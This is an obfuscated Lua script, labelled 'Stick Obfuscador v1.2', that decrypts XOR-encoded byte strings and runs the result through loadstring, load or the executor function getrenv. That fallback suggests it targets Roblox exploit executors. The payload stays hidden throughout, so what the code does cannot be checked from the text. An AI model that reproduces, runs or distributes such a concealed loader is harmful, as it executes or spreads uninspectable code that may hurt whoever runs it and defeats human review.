--[[ Stick Obfuscador v1.2 ]]
local _M
do _M=function()
local _1_l_i1illI1={"\xD0\x8A\x6E\xDB\x41\xCB\x44\x69\xD7\x07\x47\x97\x4D\x7D\x58\xCE\xC2\x5D\xB2\xF1\x00\xD5\xB0\x07\x5F\x50\x9D\x3D\x18\xDE\x24";"\x69\x54\x12\xE1\x85\x4D\xB5\xC1\x70\xB2\xA2\x6E\x7F\x62\xAB\x21\x3B\x8F\x54\x2F\xF1\x66\x95\x16\xA8\xC3";"\x29\x73\xBD\x23\x7C\xE5\x1B\x86\x31\xA1\x8D\x2D\xB8\xCD\x04\xE3";"\xC5\xFB\x54\xBA\xAD\x63\xF2\x04\xD8\x1D\x64\xA9\x59\x4C\xD0\x61";"\xEB\xD8\x9E\x65\x39\xC9\x30\x48\xF4\x0E\x3E\xEB\xF9\xE6\x2F\xBD\xBB\x03\xD9";"\x4B\x11\x9E\x03\x66\x03\xF8\xA7\x16\xC4\xEE\x4D\x9F\xE0\xE7\x02\x1A\x88\x58\x0C\xD8\x28\x18\xFD\x8F";"\x09\x5D\xDC\x45\x58\xC3\x3A\x68\xD5\x84\xAC\x0A\xD9\xA9\x25\xDD\xD4\x49\x9A\x4A\x87\x6A\x5A\xB3\x49\x54\x97\x6C\x36\x10\x8E\xBD";"\xAA\x9A\x77\x9F\x8A\x83\x19\x22\xE7\x3C\x04\xC1\x7E\x6D\xFE\x8E\xFB\x01\xB2\xF3\x30\xA8\xF9\x78\x9E\x0D\xBC\x22\x10\xD7";"\xA1\x85\x18\xF7\xBB\x2F\xE3\x66\xD1\x1E\x47\xB0\x2D\x12\xA9\x20\xD3\x6D\xC2\xB7\x7D\xA0\xCB\x4F\xFB";"\x88\xD0\x3C\xAD\xA1\x40\xD2\x88\x54\xFF\x45\xE3\x54\x2B\xB3\x2D\x59\xCB\x75\xA3\x1B\xEA\xB8\x52\xCD\xCF\x7D\x85\xBA\x91\x79";"\xE2\xB8\x85\x65\x1E\xB5\x20\x51\xBF\x04\x73\xD8\xE3\x8B\x0E\xBA\xA8\x79\xC8";"\x8D\xCC\x57\xA2\xC8\x38\x90\xB3\x19\x52\x0F\xF3\x09\x73\xDD\x0B\x28\xDA\x06\x82\x53"}
local _illIII11_l2={0xB1,0xFF,0x27,0xC1,0xAD,0x3A,0xBD,0xB0,0x14}
local _I11_l_i1il3={0xC,0x9,0x1,0x5,0x7,0x3,0x6,0x2,0xA,0x4,0x8,0xB}
local _1_l_i1illI2s={0x11,0x30,0x4F,0x6E,0x8D,0xAC,0xCB,0xEA,0x9,0x28,0x47,0x66}
local _i1illIII114={0x1,0x1,0x1,0x2,0x1,0x3,0x1,0x4,0x1,0x5,0x1,0x6,0x1,0x7,0x1,0x8,0x1,0x9,0x1,0xA,0x1,0xB,0x1,0xC,0x2,0x3}
local __i1illIII16,_lIII11_l_i17,__l_i1illII8=string.char,string.byte,table.concat
local _II11_l_i1i5
do
 local _b32=bit32
 if _b32 and _b32.bxor then _II11_l_i1i5=_b32.bxor
 else _II11_l_i1i5=function(a,b) local r,p=0,1 for _=1,8 do local x,y=a%2,b%2 if x~=y then r=r+p end a=(a-x)/2 b=(b-y)/2 p=p*2 end return r end
 end
end
local _illIII11_l11
local function _llIII11_l_9(_i1illIII115,_1_l_i1illI2) local _I11_l_i1il4={} for _illIII11_l3=1,#_i1illIII115 do local z=_lIII11_l_i17(_i1illIII115,_illIII11_l3) z=_II11_l_i1i5(z,_illIII11_l2[((_illIII11_l3-1)%#_illIII11_l2)+1]) z=_II11_l_i1i5(z,(_1_l_i1illI2+(_illIII11_l3-1)*13)%256) _I11_l_i1il4[_illIII11_l3]=__i1illIII16(z) end return __l_i1illII8(_I11_l_i1il4) end
local _I11_l_i1il12,_1_l_i1illI10=1,{}
while _I11_l_i1il12<=#_i1illIII114 do local _i1illIII1113=_i1illIII114[_I11_l_i1il12] if _i1illIII1113==1 then local _II11_l_i1i6=_i1illIII114[_I11_l_i1il12+1] _1_l_i1illI10[_II11_l_i1i6]=_llIII11_l_9(_1_l_i1illI1[_I11_l_i1il3[_II11_l_i1i6]],_1_l_i1illI2s[_II11_l_i1i6]) _I11_l_i1il12=_I11_l_i1il12+2 elseif _i1illIII1113==2 then _illIII11_l11=__l_i1illII8(_1_l_i1illI10) _I11_l_i1il12=_I11_l_i1il12+1 elseif _i1illIII1113==3 then break else _I11_l_i1il12=_I11_l_i1il12+1 end end
local __l_i1illII0=__i1illIII16(108,111,97,100,115,116,114,105,110,103)
local _llIII11_l_1=getfenv and getfenv() or _ENV or _G
local _lIII11_l_i116=loadstring or load
if not _lIII11_l_i116 and _llIII11_l_1 then _lIII11_l_i116=_llIII11_l_1[__l_i1illII0] end
if not _lIII11_l_i116 and getrenv then local r=getrenv() _lIII11_l_i116=r.loadstring or r.load end
if not _lIII11_l_i116 then error("sin loadstring") end
local _II11_l_i1i14,__i1illIII115=_lIII11_l_i116(_illIII11_l11)
if not _II11_l_i1i14 then error(__i1illIII115) end
if setfenv and getfenv then pcall(setfenv,_II11_l_i1i14,getfenv()) end
return _II11_l_i1i14()
end end
return _M()
